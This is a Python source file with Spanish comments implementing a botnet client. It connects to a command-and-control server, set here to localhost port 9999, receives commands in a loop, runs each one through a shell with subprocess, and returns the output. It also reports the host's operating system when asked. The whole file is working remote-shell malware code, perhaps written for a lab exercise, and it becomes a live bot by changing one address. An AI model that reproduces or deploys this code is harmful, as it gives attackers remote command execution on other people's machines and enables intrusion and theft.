import socket
import subprocess
import platform

HOST = "127.0.0.1"
PORT = 9999

def detectar_sistema():
    
    """
    Detecta el sistema operativo del bot.

    Usa la función platform.system() para determinar el sistema operativo
    del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
    """
    return platform.system().lower()  # "windows" o "linux"

def conectar_a_CnC():
    
    """
    Establece una conexión del bot al servidor de Comando y Control (C&C).

    Crea un socket TCP/IP y se conecta al servidor C&C usando la dirección
    y puerto especificados por las variables HOST y PORT. Devuelve el socket
    conectado para permitir la comunicación con el servidor.

    :return: El socket conectado al servidor C&C.
    """

    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((HOST, PORT))
    print(f"Conectado al servidor C&C {HOST}:{PORT}")
    return bot

# Función para esperar órdenes del servidor C&C
def esperar_ordenes(bot):
    
    """
    Espera y procesa órdenes enviadas por el servidor C&C al bot.

    Entra en un bucle infinito donde recibe comandos del servidor C&C 
    a través del socket proporcionado. Si el comando recibido es "detect_os", 
    responde con el sistema operativo del bot. Para otros comandos, los ejecuta 
    utilizando la función ejecutar_comando y envía el resultado de vuelta al 
    servidor. Si ocurre un error durante la recepción o ejecución de un comando, 
    se imprime el error y se rompe el bucle.

    :param bot: El socket conectado al servidor C&C.
    """

    while True:
        try:
            orden = bot.recv(1024).decode('utf-8', errors='ignore').strip() # Recibir el comando
            if not orden:
                continue  # Si la orden está vacía, seguir esperando
            
            print(f"Comando recibido: {orden}")

            if orden == "detect_os": # Si el comando es "detect_os"
                bot.send(detectar_sistema().encode("utf-8")) # Enviar el sistema operativo del bot
                continue
            resultado = ejecutar_comando(orden) # Ejecutar el comando
            bot.send(resultado if resultado else b"Comando ejecutado sin salida") # Enviar el resultado

        except Exception as e:
            print(f"Error: {e}")
            break

def ejecutar_comando(orden):
    
    """
    Ejecuta un comando del sistema operativo recibido como cadena.

    Usa subprocess para ejecutar el comando proporcionado y captura su salida.
    Si el comando se ejecuta correctamente, devuelve la salida. Si ocurre un 
    error durante la ejecución, captura la salida de error y la devuelve 
    como mensaje de error.

    :param orden: Comando del sistema a ejecutar.
    :return: Salida del comando o mensaje de error en caso de fallo.
    """

    try:
        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Ejecutar el comando
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8') # Devolver el error

def ejecutar_bot():
    
    """
    Función principal que conecta el bot al servidor C&C y espera órdenes.

    Establece la conexión con el servidor de Comando y Control (C&C) usando
    la función conectar_a_CnC y luego entra en un bucle para recibir y
    procesar órdenes mediante la función esperar_ordenes.

    :return: None
    """

    bot = conectar_a_CnC() # Conectar al servidor C&C
    esperar_ordenes(bot) # Esperar y procesar órdenes

if __name__ == "__main__":
    ejecutar_bot() # Ejecutar el bot